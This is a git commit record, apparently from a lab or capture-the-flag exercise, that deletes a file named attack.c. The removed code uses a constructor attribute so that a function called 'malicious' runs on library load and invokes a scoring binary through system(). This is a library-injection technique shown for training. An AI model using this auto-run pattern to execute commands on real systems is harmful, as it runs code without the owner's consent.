cb427bba9b2cae66525d7fd97d4c4faed34abcb4
Zuzuss <47058458+Zuzuss@users.noreply.github.com>
2023-11-16 21:02:27 +0300

    Delete attack.c

--- attack.c
+++
@@ -1,9 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 8c88850d-0397-4369-a225-c54dc7ad5ed2");
-}
-
